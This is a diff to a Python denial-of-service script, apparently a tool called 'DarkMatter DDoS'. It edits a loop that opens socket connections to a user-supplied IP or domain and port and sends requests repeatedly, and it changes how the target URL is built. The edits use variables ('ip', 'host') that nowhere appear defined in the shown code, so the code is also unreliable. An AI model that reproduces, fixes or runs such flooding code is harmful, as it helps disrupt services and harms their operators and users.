@@ -56,7 +56,7 @@ def attack():
   while True:
     try:
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      atk.connect((url, ))
+      atk.connect((ip, port))
       #Attack starts here
       for y in range(80):
           atk.send(str.encode(request))
@@ -68,7 +68,7 @@ def attack():
 print("Bienvenido a DarkMatter DDoS\n")
 url = input("IPV4/Domain: ")
 port = int(input("Port: "))
-url = f"https://{str(url)}"
+url = f"https://{str(host)}"
 print("[>>>] RS-28 Sarmat [<<<]")
 sleep(1)
 
